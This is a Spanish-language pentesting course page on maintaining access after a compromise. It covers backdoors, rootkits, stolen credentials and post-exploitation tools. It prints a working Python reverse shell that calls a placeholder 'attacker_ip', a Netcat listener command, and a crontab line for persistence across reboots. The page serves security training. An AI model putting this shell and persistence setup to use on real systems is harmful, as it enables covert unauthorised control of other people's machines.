<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mantenimiento del Acceso</title>

    <link rel="alternate" href="https://campusempresa.com/es/pentesting/mantenimiento-acceso" hreflang="es" />
    <link rel="alternate" href="https://campusempresa.com/es/pentesting/mantenimiento-acceso" hreflang="x-default" />
	<link rel="alternate" href="https://campusempresa.com/ca/pentesting/mantenimiento-acceso" hreflang="ca" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body>
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/es/"><img src="/img/logo_header.png" style="visibility:hiddenxx;"></a>
			</h1>
		</div>
		<div class="col-4 p-0 text-end">
			<h2 id="main_title"><cite>Construyendo la sociedad de hoy y del mañana</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
										<b id="lit_lang_es" class="px-2">ES</b>
				|
				<a href="/ca/pentesting/mantenimiento-acceso" id="lnk_lang_ca" data-lang="ca" class="px-2">CA</a>
					</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/es/objective">El Proyecto</a>
				<a href="/es/about">Sobre nosotros</a>
				<a href="/es/contribute">Contribuir</a>
				<a href="/es/donate">Donaciones</a>
				<a href="/es/licence">Licencia</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content"><div class='row navigation'>
	<div class='col-4'>
					<a href='uso-metasploit'>&#x25C4;Uso de Metasploit y Otras Herramientas</a>
			</div>
	<div class='col-4 text-center'>
		<a href="./" class="title">Mantenimiento del Acceso</a>
	</div>
	<div class='col-4 text-end'>
					<a href='escalamiento-privilegios'>Escalamiento de Privilegios &#x25BA;</a>
			</div>
</div>
<div class='content'><p>En esta sección del curso sobre Pentesting, nos enfocaremos en el mantenimiento del acceso. Este es un paso crucial en el proceso de pruebas de penetración, ya que permite a los pentesters mantener su presencia en el sistema objetivo después de haber obtenido acceso inicial. Esto es esencial para realizar análisis más profundos y recopilar información adicional.</p>
</div><h1>Objetivos del Mantenimiento del Acceso</h1>
<div class='content'><ul>
<li><strong>Persistencia</strong>: Asegurar que el acceso al sistema se mantenga incluso después de reinicios o cambios en la red.</li>
<li><strong>Evasión</strong>: Evitar la detección por parte de sistemas de seguridad y administradores.</li>
<li><strong>Control</strong>: Mantener la capacidad de ejecutar comandos y extraer datos del sistema comprometido.</li>
</ul>
</div><h1>Técnicas Comunes para el Mantenimiento del Acceso</h1>
<div class='content'></div><h2>Backdoors</h2>
<div class='content'><p>Las backdoors son métodos para acceder a un sistema que eluden la autenticación normal. Pueden ser instaladas en el sistema comprometido para permitir el acceso en el futuro.</p>
<ul>
<li><strong>Tipos de Backdoors</strong>:
<ul>
<li><strong>Shells inversas</strong>: El sistema comprometido se conecta de vuelta al atacante.</li>
<li><strong>Shells bind</strong>: El atacante se conecta directamente al sistema comprometido.</li>
</ul>
</li>
</ul>
<h4>Ejemplo de Shell Inversa en Python</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiYXR0YWNrZXJfaXAiLCA0NDQ0KSkKCndoaWxlIFRydWU6CiAgICBjb21tYW5kID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpCiAgICBpZiBjb21tYW5kLmxvd2VyKCkgPT0gImV4aXQiOgogICAgICAgIGJyZWFrCiAgICBvdXRwdXQgPSBzdWJwcm9jZXNzLnJ1bihjb21tYW5kLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKQogICAgcy5zZW5kKG91dHB1dC5zdGRvdXQgKyBvdXRwdXQuc3RkZXJyKQoKcy5jbG9zZSgp"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((&quot;attacker_ip&quot;, 4444))

while True:
    command = s.recv(1024).decode()
    if command.lower() == &quot;exit&quot;:
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)

s.close()</pre></div><div class='content'></div><h2>Rootkits</h2>
<div class='content'><p>Los rootkits son herramientas que permiten a los atacantes mantener el acceso y ocultar su presencia en el sistema comprometido.</p>
<ul>
<li><strong>Tipos de Rootkits</strong>:
<ul>
<li><strong>Kernel-level</strong>: Modifican el núcleo del sistema operativo.</li>
<li><strong>User-level</strong>: Operan en el espacio de usuario y son más fáciles de detectar.</li>
</ul>
</li>
</ul>
</div><h2>Credenciales Robadas</h2>
<div class='content'><p>El uso de credenciales robadas es una técnica común para mantener el acceso. Los atacantes pueden capturar credenciales mediante keyloggers, phishing, o exploits.</p>
<ul>
<li><strong>Métodos de Captura</strong>:
<ul>
<li><strong>Keyloggers</strong>: Registran las pulsaciones de teclas.</li>
<li><strong>Phishing</strong>: Engañan a los usuarios para que revelen sus credenciales.</li>
<li><strong>Exploits</strong>: Aprovechan vulnerabilidades para obtener credenciales.</li>
</ul>
</li>
</ul>
</div><h1>Herramientas Populares para el Mantenimiento del Acceso</h1>
<div class='content'><p>| Herramienta        | Descripción                                                                 | Uso Principal       |
|--------------------|-----------------------------------------------------------------------------|---------------------|
| Metasploit         | Framework de pentesting que incluye módulos para backdoors y persistencia.  | Shells inversas     |
| Empire             | Framework de post-explotación que facilita la persistencia y evasión.       | Persistencia        |
| Cobalt Strike      | Plataforma de simulación de adversarios que incluye herramientas de acceso. | Control y evasión   |</p>
</div><h1>Ejercicio Práctico</h1>
<div class='content'></div><h2>Objetivo</h2>
<div class='content'><p>Instalar una shell inversa en un sistema de prueba y mantener el acceso después de un reinicio.</p>
</div><h2>Pasos</h2>
<div class='content'><ol>
<li>
<p><strong>Configurar el Listener</strong>:</p>
<ul>
<li>En el sistema atacante, configurar un listener usando Netcat:
<pre><code class="language-bash">nc -lvp 4444
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Crear la Shell Inversa</strong>:</p>
<ul>
<li>En el sistema objetivo, crear un script de shell inversa en Python (como el ejemplo anterior).</li>
</ul>
</li>
<li>
<p><strong>Automatizar la Persistencia</strong>:</p>
<ul>
<li>Crear un script de inicio en el sistema objetivo para ejecutar la shell inversa al inicio:
<pre><code class="language-bash">echo &quot;@reboot python /path/to/reverse_shell.py&quot; &gt;&gt; /etc/crontab
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Reiniciar el Sistema</strong>:</p>
<ul>
<li>Reiniciar el sistema objetivo y verificar que el acceso se mantiene.</li>
</ul>
</li>
</ol>
</div><h1>Conclusión</h1>
<div class='content'><p>El mantenimiento del acceso es una etapa crítica en el pentesting que permite a los atacantes realizar análisis continuos y profundos en el sistema comprometido. Comprender y aplicar técnicas como backdoors, rootkits y el uso de credenciales robadas es esencial para cualquier pentester. Además, el uso de herramientas especializadas puede facilitar enormemente este proceso. Practicar estas técnicas en entornos controlados es fundamental para desarrollar habilidades efectivas y seguras.</p>
</div><div class='row navigation'>
	<div class='col-4'>
					<a href='uso-metasploit'>&#x25C4;Uso de Metasploit y Otras Herramientas</a>
			</div>
	<div class='col-4 text-center'>
		<a href="./" class="title">Mantenimiento del Acceso</a>
	</div>
	<div class='col-4 text-end'>
					<a href='escalamiento-privilegios'>Escalamiento de Privilegios &#x25BA;</a>
			</div>
</div>
</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Publicidad</h1>
			<p>Este espacio está destinado a publicidad.</p>
			<p>Si quieres ser patrocinador, contáctanos para incluir enlaces en esta zona: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>¡Gracias por colaborar!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Todos los derechos reservados</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Entès!</a>
    <a href="/es/cookies">Més informació</a>
</div>	

	</div>    
</body>
</html>
